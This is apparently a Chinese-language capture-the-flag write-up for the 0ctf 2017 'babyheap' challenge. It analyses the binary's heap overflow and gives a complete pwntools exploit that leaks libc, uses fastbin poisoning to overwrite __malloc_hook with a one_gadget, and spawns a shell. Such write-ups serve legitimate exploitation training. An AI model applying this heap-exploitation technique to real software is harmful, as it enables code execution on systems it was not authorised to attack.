#### 分析

1. checksec

   ```
   ┌──(root㉿kali)-[/home/kali/Desktop]
   └─# checksec babyheap_0ctf_2017 
   [*] '/home/kali/Desktop/babyheap_0ctf_2017'
       Arch:     amd64-64-little
       RELRO:    Full RELRO
       Stack:    Canary found
       NX:       NX enabled
       PIE:      PIE enabled
   ```

   保护全开
2. 四个功能，Allocate，Fill，Free，Dump

   * add：采用calloc分配堆块，a1是一个全局结构体数组，结构体有三成员，DWORD标志位0或1，QWORD储存chunk大小，QWORD储存chunk地址
   * fill：判断了堆块是否存在，编辑堆块内容，没有对size做检查，造成堆溢出
   * delete：判断了堆块是否存在，释放时清空结构体
   * dump：输出指定堆块内容，但是对大小做了限制

#### exp

暂先使用libc2.23打

利用给堆赋值时长度不受限制，将下一堆块的size字段改成较大chunk，即可输出和修改下一chunk内容

首先将被覆盖掉的chunk放入unsortedbin泄露libc基址，然后将被覆盖掉的chunk放入fastbin修改fd指向malloc_hook上方的一段内存空间，

第二次分配时这块chunk被劫持到malloc_hook上方，覆盖malloc_hook为one_gadget

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')

io = process('/home/kali/pwn/0ctf_2017_babyheap')

libc = ELF('/home/kali/pwn/libc/x64/libc-2.23.so')


def add(size):
    io.sendlineafter(b'Command: ',b'1')
    io.sendlineafter(b'Size: ',str(size).encode(encoding='utf-8'))


def edit(index,size,content):
    io.sendlineafter(b'Command: ',b'2')
    io.sendlineafter(b'Index: ',str(index).encode(encoding='utf-8'))
    io.sendlineafter(b'Size: ',str(size).encode(encoding='utf-8'))
    io.sendafter(b'Content: ',content)


def free(index):
    io.sendlineafter(b'Command: ', b'3')
    io.sendlineafter(b'Index: ',str(index).encode(encoding='utf-8'))

def dump(index):
    io.sendlineafter(b'Command: ', b'4')
    io.sendlineafter(b'Index: ', str(index).encode(encoding='utf-8'))


one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]
malloc_hook_offset = libc.symbols['__malloc_hook']

add(0x10)
add(0x100)
add(0x100)
add(0x100)

free(1)
edit(0,0x20,b'a'*0x10 + p64(0)+p64(0x221))

add(0x210)

edit(1,0x110,b'a'*0x100 + p64(0)+p64(0x111))

free(2)

dump(1)

libc_base = u64(io.recvuntil(b'\x7f')[-6::].ljust(8,b'\x00'))
print(hex(libc_base))

arena_offset = 0x3c4b78
libc_base = libc_base - arena_offset

malloc_hook = libc_base+malloc_hook_offset
tar_addr = malloc_hook - 0x20 + 0x5 - 0x8   # tar_addr+0x10 = malloc_hook - 0x13

add(0x60)
free(2)

edit(1,0x118,b'a'*0x100 + p64(0)+p64(0x71)+p64(tar_addr))

add(0x60)
add(0x60)

edit(4,0x13+0x8,b'a'*0x13 + p64(one_gadget[1]+libc_base))

add(0x200)

# gdb.attach(io)
io.interactive()
```
